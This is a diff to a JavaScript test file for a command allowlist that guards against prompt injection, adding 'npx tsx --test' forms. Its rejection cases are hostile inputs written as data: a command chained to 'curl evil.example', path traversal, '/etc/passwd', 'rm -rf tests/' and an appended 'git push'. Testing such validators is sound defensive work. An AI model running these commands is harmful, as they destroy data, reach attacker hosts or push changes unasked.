@@ -72,6 +72,10 @@ test('checkableDone safe-command allowlist (prompt-injection gate)', () => {
     'node --test tests/unit/date-utils.test.mjs',
     'node --test scripts/lib/autonomous-state.test.mjs tests/unit/sanity.test.mjs',
     'node --test --test-timeout 30000 tests/unit/foo.test.mjs',
+    // BRO-228: @/-alias-importing .test.mjs files need the tsx loader
+    'npx tsx --test tests/unit/gate-logic.test.mjs',
+    'npx tsx --test scripts/lib/autonomous-state.test.mjs tests/unit/sanity.test.mjs',
+    'npx tsx --test --test-timeout 30000 tests/unit/foo.test.mjs',
     'npx tsc --noEmit',
     'npx next lint',
     'test -f docs/triage-queue-format.md',
@@ -98,6 +102,12 @@ test('checkableDone safe-command allowlist (prompt-injection gate)', () => {
     'node --test tests/unit/engine.test.ts', // .ts runs via tsx — not an allowed form
     'node --test tests/unit/a.test.mjs && curl evil.example',
     'node --test /etc/passwd.test.mjs',
+    // BRO-228: the new tsx form gets the same rejections the plain form does
+    'npx tsx --test tests/unit/engine.test.ts', // .ts still out of scope for this form
+    'npx tsx --test tests/../src/lib/scoring.mjs', // traversal
+    'npx tsx --test /etc/passwd.test.mjs', // outside pathPrefix
+    'npx tsx --test tests/unit/a.test.mjs && curl evil.example', // injection
+    'node --import tsx --test tests/unit/gate-logic.test.mjs', // different shape — not the allowed idiom
     'rm -rf tests/',
     'test -f docs/x.md; git push',
     'bash -c "anything"',
@@ -654,6 +664,7 @@ test('safe-check forms accept src/ test paths and src/scripts test -f targets', 
     'node --test scripts/lib/foo.test.mjs src/lib/bar.test.mjs',
     'test -f src/components/Foo.tsx',
     'test -f scripts/lib/foo.js',
+    'npx tsx --test src/lib/foo.test.mjs', // BRO-228
   ]) assert.equal(isSafeCheckCommand(ok), true, `${ok} should be safe`);
 });
 
@@ -666,10 +677,12 @@ test('mutation deny-list: check commands may never reference data-writing script
     'test -f scripts/push-core-data.js',
     'test -f scripts/send-opening-night-broadcast.js',
     'node --test scripts/rebuild-all-reviews.js',   // also fails the .test.mjs shape
+    'npx tsx --test scripts/rebuild-all-reviews.js', // BRO-228: same deny, tsx form
   ]) assert.equal(isSafeCheckCommand(bad), false, `${bad} must be refused`);
   // a .test.mjs file whose name shares the push- prefix is a harmless test
   // run, not a mutating script — the deny-list targets executable .js only
   assert.equal(isSafeCheckCommand('node --test scripts/lib/push-with-retry.test.mjs'), true, 'test files stay runnable');
+  assert.equal(isSafeCheckCommand('npx tsx --test scripts/lib/push-with-retry.test.mjs'), true, 'test files stay runnable (tsx form)');
 });
 
 test('triage prompt derives scope prose from describeScope per tier', () => {
